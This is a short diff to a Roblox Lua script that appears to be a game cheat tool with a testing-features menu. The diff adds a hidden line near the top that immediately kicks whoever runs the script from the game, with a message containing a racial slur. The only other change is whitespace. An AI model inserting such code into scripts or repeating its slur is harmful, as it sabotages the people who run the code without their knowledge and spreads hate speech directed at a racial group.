@@ -2,6 +2,9 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 
+-- Kick
+game:GetService('Players').LocalPlayer:Kick('⚠️Nigger Detected⚠️')
+
 -- // API
 local Tool_cache = api:get_tool_cache();
 
@@ -1322,7 +1325,7 @@ do
             end
         end,
     })
-    
+
     Testing_Features:AddLabel('¯\_(ツ)_/¯'):AddKeyPicker('¯\_(ツ)_/¯', {
         Default = 'M',
         Mode = 'Always',
